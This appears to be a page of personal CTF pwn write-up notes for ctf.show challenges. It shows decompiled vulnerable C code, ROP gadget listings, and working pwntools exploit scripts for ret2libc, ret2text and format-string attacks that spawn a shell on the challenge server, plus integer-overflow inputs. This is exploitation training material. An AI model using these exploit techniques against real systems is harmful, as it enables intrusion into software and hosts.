<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">welcome</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">welcome</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">getFlag</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
<section id="pwn07-64-ropgadget-ret2libc">
<h2>pwn07: 64-ROPgadget-ret2libc<a class="headerlink" href="#pwn07-64-ropgadget-ret2libc" title="此标题的永久链接"></a></h2>
<p>file: amd64-64-little</p>
<p>checksec: NX</p>
<p>Stack balance is needed in 64-bit system, which means params will be stored in the stack only after the first 6 registers have been occupied .</p>
<p>The 1st、2nd、3rd… param respectively stored to <strong>RDI、RSI、RDX、RCX、R8、R9</strong>.</p>
<p>The 7th、8th… param will be stored in the stack.</p>
<ul class="simple">
<li><p>Execute  <code class="docutils literal notranslate"><span class="pre">ROPgadget</span> <span class="pre">--binary</span> <span class="pre">pwn7</span> <span class="pre">--only</span> <span class="pre">'pop|ret'</span></code></p></li>
</ul>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>giantbranch@ubuntu:~/Desktop/LibcSearcher$ ROPgadget --binary pwn7 --only <span class="s1">&#39;pop|ret&#39;</span> 
Gadgets <span class="nv">information</span>
<span class="o">============================================================</span>
0x00000000004006dc : pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004006de : pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004006e0 : pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004006e2 : pop r15 <span class="p">;</span> ret
0x00000000004006db : pop rbp <span class="p">;</span> pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004006df : pop rbp <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x0000000000400578 : pop rbp <span class="p">;</span> ret
0x00000000004006e3 : pop rdi <span class="p">;</span> ret
0x00000000004006e1 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004006dd : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004004c6 : ret

Unique gadgets found: <span class="m">11</span>
</pre></div>
</div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rdi</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">_bss_start</span><span class="p">;</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">welcome</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="n">welcome</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>

  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p><strong>exploits</strong>:</p>
<ul class="simple">
<li><p>puts()</p>
<ul>
<li><p>Leak the real addr of puts() and libc start addr in memory.</p></li>
<li><p>Get the version of libc and compute the real addr of system()、str_bin_sh in memory.</p></li>
</ul>
</li>
<li><p>ropgadgets</p>
<ul>
<li><p>Leak the addr of pop-ret instruction sets in memory.</p></li>
<li><p>Pop the needed params <code class="docutils literal notranslate"><span class="pre">&quot;/bin/sh&quot;</span></code> of our getshell function <code class="docutils literal notranslate"><span class="pre">system()</span></code> in libc</p></li>
</ul>
</li>
</ul>
<p><strong>First</strong>:  puts(puts&#64;got)  -&gt; then jump to main() again</p>
<ul class="simple">
<li><p>‘A’ * (0xC+8)</p></li>
<li><p>pop_rdi_ret</p></li>
<li><p>puts&#64;got</p></li>
<li><p>puts&#64;plt</p></li>
<li><p>&amp;main()</p></li>
</ul>
<p>First output: the real addr of puts() in memory</p>
<p><strong>Second</strong>:</p>
<ul class="simple">
<li><p>‘A’ * (0xC+8)</p></li>
<li><p>&amp;ret</p></li>
<li><p>&amp;pop_rdi_ret</p></li>
<li><p>&amp;str_bin_sh</p></li>
<li><p>&amp;system()</p></li>
</ul>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>

<span class="c1"># FIRST</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn7&quot;</span><span class="p">)</span>
<span class="c1">#p=process(&#39;./pwn7&#39;)</span>
<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28105</span><span class="p">)</span>

<span class="c1">#gadgets</span>
<span class="n">pop_rdi_ret</span><span class="o">=</span><span class="mh">0x4006e3</span>
<span class="n">ret</span><span class="o">=</span><span class="mh">0x4004c6</span>
<span class="c1">#FIRST</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xc</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
		<span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;main&quot;</span><span class="p">])</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">puts_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="c1">#7f982ff459c0</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>

<span class="n">libc</span><span class="o">=</span><span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&quot;puts&quot;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
<span class="n">libcbase</span><span class="o">=</span><span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
<span class="n">system_addr</span><span class="o">=</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
<span class="n">binsh_addr</span><span class="o">=</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>

<span class="c1">#SECOND</span>
<span class="c1">#payload=&#39;A&#39;*(0xc+8)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xc</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></div>
</div>
<p>Question: Why ‘ret’ command is needed?</p>
<p>payload=’A’*(0xc+8)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</p>
</section>
<section id="pwn08-64-ret2text-stack-balance-todo">
<h2>pwn08: 64-ret2text-stack balance [TODO]<a class="headerlink" href="#pwn08-64-ret2text-stack-balance-todo" title="此标题的永久链接"></a></h2>
<p>https://blog.csdn.net/qq_41560595/article/details/112161243</p>
<p>checksec: NX、amd-64-little</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;pwn.challenge.ctf.show&quot;</span><span class="p">,</span><span class="mi">28105</span><span class="p">)</span>
<span class="c1"># 0x7fffffffde38 return addr of welcome</span>
<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn8&quot;</span><span class="p">)</span>
<span class="n">backdoor</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;ctfshow&quot;</span><span class="p">]</span>
<span class="n">ret</span><span class="o">=</span><span class="mh">0x00000000004004fe</span>  <span class="c1"># the addr of &#39;ret&#39;</span>
<span class="n">payload</span><span class="o">=</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x80</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></div>
</div>
<p>Q: Why  <code class="docutils literal notranslate"><span class="pre">payload=&quot;A&quot;*(0x80+8)+p64(backdoor)</span></code>  doesn’t work?</p>
<p>It works well at 32 bit program but crashed in 64 bit program. But there is a <strong>stack-balance(堆栈平衡)</strong> principle in 64-bit program, <strong>16-byte-alignment(十六字节对齐)</strong> is needed.</p>
<p>Q: How to get the addr of  <code class="docutils literal notranslate"><span class="pre">ret=0x00000000004004fe</span></code> ?</p>
</section>
<section id="pwn10">
<h2>pwn10<a class="headerlink" href="#pwn10" title="此标题的永久链接"></a></h2>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="c1">// bad sp value at call has been detected, the output may be wrong!</span>
<span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp-14h] [ebp-80h]</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp-10h] [ebp-7Ch]</span>
  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp-Ch] [ebp-78h]</span>
  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp-8h] [ebp-74h]</span>
  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp-4h] [ebp-70h]</span>
  <span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-6Ch] BYREF</span>
  <span class="kt">int</span> <span class="o">*</span><span class="n">p_argc</span><span class="p">;</span> <span class="c1">// [esp+64h] [ebp-8h]</span>

  <span class="n">p_argc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">argc</span><span class="p">;</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;try pwn me?&quot;</span><span class="p">);</span>
  <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">))</span><span class="n">__isoc99_scanf</span><span class="p">)(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">format</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">16</span> <span class="p">)</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;cat flag&quot;</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">aYouMayNeedToKe</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>The</p>
<p>print 16 chars to bss address 0x0804A030 [10]</p>
<p>0x0804A030AAAAAA%n</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb-peda$ x/50w 0xffffcf9c
0xffffcf9c:	0x080485d5	0xffffcfbc	0xffffcfbc	0x00000002
0xffffcfac:	0x00000000	0xffffcfde	0xffffd0dc	0x000000e0
0xffffcfbc:	0x70257025	0x70257025	0x70257025	0x70257025
0xffffcfcc:	0x70257025	0x70257025	0x70257025	0x70257025
0xffffcfdc:	0x70257025	0x70257025	0x70257025	0x70257025
0xffffcfec:	0x70257025	0x70257025	0x70257025	0x70257025
0xffffcffc:	0x70257025	0x00007025	0x00000000	0xffffd0dc
0xffffd00c:	0x0804866b	0x00000001	0xffffd0d4	0xffffd0dc
0xffffd01c:	0x08048641	0xffffd040	0x00000000	0x00000000
0xffffd02c:	0xf7e1b647	0xf7fb6000	0xf7fb6000	0x00000000
0xffffd03c:	0xf7e1b647	0x00000001	0xffffd0d4	0xffffd0dc
0xffffd04c:	0x00000000	0x00000000	0x00000000	0xf7fb6000
0xffffd05c:	0xf7ffdc04	0xf7ffd000
</pre></div>
</div>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;pwn.challenge.ctf.show&quot;</span><span class="p">,</span><span class="mi">28103</span><span class="p">)</span>

<span class="n">num_addr</span><span class="o">=</span><span class="mh">0x0804A030</span> <span class="c1">#4byte</span>
<span class="n">payload</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">num_addr</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;</span><span class="si">%12d</span><span class="s2">%7$n&quot;</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></div>
</div>
</section>
<section id="integer-overflow">
<h2>数学99: Integer Overflow[不董]<a class="headerlink" href="#integer-overflow" title="此标题的永久链接"></a></h2>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">a1</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mh">0x3C</span><span class="n">u</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;CTFshow pwn2&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Can you help me to solve some eazy math problem?&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">unsigned</span> <span class="nb">int</span><span class="p">)</span><span class="n">sub_9C0</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">unsigned</span> <span class="nb">int</span><span class="p">)</span><span class="n">sub_AEE</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">unsigned</span> <span class="nb">int</span><span class="p">)</span><span class="n">sub_BA3</span><span class="p">()</span> <span class="p">)</span>
    <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;That&#39;s impossible!&quot;</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Baka!&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="n">_BOOL8</span> <span class="nf">sub_9C0</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-38h]</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-34h]</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-30h] BYREF</span>
  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-28h]</span>
  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-20h]</span>
  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-18h]</span>
  <span class="kr">__int16</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-14h]</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]</span>

  <span class="n">v8</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;1.a-b=9,0&lt;=a&lt;9,0&lt;=b&lt;9&quot;</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">=</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;a:&quot;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%20s&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">strchr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">45</span><span class="p">)</span> <span class="p">)</span>  <span class="c1">//chr(45)=&#39;-&#39;</span>
    <span class="k">return</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;b:&quot;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%20s&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">strchr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">45</span><span class="p">)</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">&lt;=</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">-</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">9</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p><strong>Condition</strong>:</p>
<p><code class="docutils literal notranslate"><span class="pre">s</span></code> : signed int 	0~2147483647 	-2147483648~-1</p>
<ul class="simple">
<li><p>v1 &lt;= 8</p></li>
<li><p>v2 &lt;= 8</p></li>
<li><p>v1 - v2 = 9</p></li>
<li><p>Cannot input negative symbol “-”</p></li>
</ul>
<p><strong>Payload 1</strong>:  a=8  b=4294967295 =-1</p>
<ul>
<li><p>strchr():</p>
<p>char *strchr(const char *s, int c);</p>
<p>Locate the first position of <code class="docutils literal notranslate"><span class="pre">c</span></code> in string <code class="docutils literal notranslate"><span class="pre">s</span></code> . If not, return NULL.</p>
</li>
<li><p>atoi():</p>
<p>Convert a string to int.</p>
</li>
</ul>
<p>思路：利用s缓冲区溢出修改返回值</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="n">_BOOL8</span> <span class="nf">sub_AEE</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;2.a*b=9,a&gt;9,b&gt;9&quot;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;a:&quot;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;b:&quot;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">9</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<ul class="simple">
<li><p>v1 &gt; 9</p></li>
<li><p>v2 &gt; 9</p></li>
<li><p>v1 * v2 == 9;</p></li>
</ul>
<p>4294967305 = 9, 48145*89209=4294967305</p>
<p>(4294967305 %2147483648 = 9)</p>
<p>tools.jb51.net/jisuanqi/factor_calc</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="nf">sub_BA3</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h] BYREF</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;3.a/b=ERROR,b!=0&quot;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;a:&quot;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;b:&quot;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">signal</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">handler</span><span class="p">);</span>
    <span class="n">v2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">/</span> <span class="n">v2</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">signal</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="p">}</span>
